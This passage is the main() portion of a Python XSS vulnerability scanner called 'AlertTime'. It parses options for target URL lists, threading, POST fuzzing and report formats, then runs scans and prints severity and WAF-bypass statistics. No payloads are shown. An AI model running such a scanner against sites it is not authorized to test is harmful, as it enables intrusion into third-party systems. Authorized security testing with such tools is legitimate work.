            print(f"{Fore.RED}[-] HTML report generation failed: {e}{Style.RESET_ALL}")
def main():
    parser = argparse.ArgumentParser(
        description=f'AlertTime XSS Scanner v{__version__} - Advanced Multi-threaded XSS Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Author: {__author__}
LinkedIn: {__linkedin__}

Usage Examples:
  python3 alerttime.py -l targets.txt -t 25 -o results.json
  python3 alerttime.py -l urls.txt -t 40 --delay 0.1 --html-report
  python3 alerttime.py -l targets.txt --method POST --data "search=FUZZ&type=query"
  python3 alerttime.py -l urls.txt -t 30 --format csv -o report.csv
        """
    )
    
    parser.add_argument('-l', '--list', required=True, 
                       help='Target URL list file (one URL per line)')
    
    parser.add_argument('-o', '--output', default='alerttime_scan.json',
                       help='Output file path (default: alerttime_scan.json)')
    parser.add_argument('--format', choices=['json', 'txt', 'csv'], default='json',
                       help='Output format (default: json)')
    parser.add_argument('--html-report', action='store_true',
                       help='Generate professional HTML report')
    
    parser.add_argument('-t', '--threads', type=int, default=25,
                       help='Concurrent threads (default: 25, max: 100)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout seconds (default: 10)')
    parser.add_argument('--delay', type=float, default=0.15,
                       help='Inter-request delay seconds (default: 0.15)')
    
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET',
                       help='HTTP method (default: GET)')
    parser.add_argument('--data', 
                       help='POST data with FUZZ placeholder')
    
    parser.add_argument('--user-agent',
                       help='Custom User-Agent string')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output mode')
    
    args = parser.parse_args()
    
    if args.threads > 100:
        print(f"{Fore.YELLOW}[!] Thread count limited to 100 for stability{Style.RESET_ALL}")
        args.threads = 100
    
    scanner = AlertTimeScanner(
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay
    )
    
    scanner.display_banner()
    
    try:
        with open(args.list, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f.readlines() 
                   if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Target file not found: {args.list}{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[-] File read error: {e}{Style.RESET_ALL}")
        sys.exit(1)
    
    if not urls:
        print(f"{Fore.RED}[-] No valid URLs found in target file{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.CYAN}[+] Loaded {len(urls)} target URLs for security assessment{Style.RESET_ALL}")
    
    post_data = None
    if args.method == 'POST' and args.data:
        if '&' in args.data:
            post_data = {}
            for pair in args.data.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    post_data[key] = value
        else:
            post_data = args.data
    
    start_time = time.time()
    print(f"\n{Fore.YELLOW}[*] Initiating security assessment...{Style.RESET_ALL}")
    
    vulnerabilities = scanner.scan_url_batch(urls, args.method, post_data)
    
    end_time = time.time()
    scan_duration = end_time - start_time
    
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"SECURITY ASSESSMENT COMPLETED")
    print(f"{'='*70}")
    print(f"Target URLs Assessed: {len(urls)}")
    print(f"Security Tests Executed: {scanner.tested_count}")
    print(f"Vulnerabilities Identified: {len(vulnerabilities)}")
    print(f"Assessment Duration: {scan_duration:.2f} seconds")
    print(f"Testing Rate: {scanner.tested_count/scan_duration:.1f} tests/second")
    if scanner.tested_count > 0:
        print(f"Vulnerability Rate: {(len(vulnerabilities)/scanner.tested_count*100):.2f}%")
    print(f"{'='*70}{Style.RESET_ALL}")
    
    if vulnerabilities or args.format:
        scanner.save_results(vulnerabilities, args.output, args.format)
        
        if args.html_report:
            html_file = args.output.rsplit('.', 1)[0] + '.html'
            scanner.generate_html_report(vulnerabilities, html_file)
    
    if vulnerabilities:
        print(f"\n{Fore.RED}[!] SECURITY ALERT: {len(vulnerabilities)} vulnerabilities detected!{Style.RESET_ALL}")
        
        severity_stats = scanner._get_severity_stats(vulnerabilities)
        method_stats = scanner._get_method_stats(vulnerabilities)
        waf_stats = scanner._get_waf_stats(vulnerabilities)
        
        print(f"\n{Fore.YELLOW}Risk Assessment Summary:{Style.RESET_ALL}")
        for severity, count in severity_stats.items():
            color = Fore.RED if severity == 'High' else Fore.YELLOW if severity == 'Medium' else Fore.GREEN
            print(f"  {color}{severity} Risk: {count} vulnerabilities{Style.RESET_ALL}")
        
        if any(waf for waf in waf_stats.keys() if waf != 'None'):
            print(f"\n{Fore.MAGENTA}WAF Bypass Success:{Style.RESET_ALL}")
            for waf, count in waf_stats.items():
                if waf != 'None':
                    print(f"  {waf}: {count} bypasses")
    else:
        print(f"\n{Fore.GREEN}[+] SECURITY STATUS: No vulnerabilities detected{Style.RESET_ALL}")
        print(f"[+] All tested endpoints appear to be properly secured")
    
    print(f"\n{Fore.CYAN}[*] Security assessment completed successfully{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Remember: This tool is for authorized testing only{Style.RESET_ALL}")

if __name__ == "__main__":

    main()
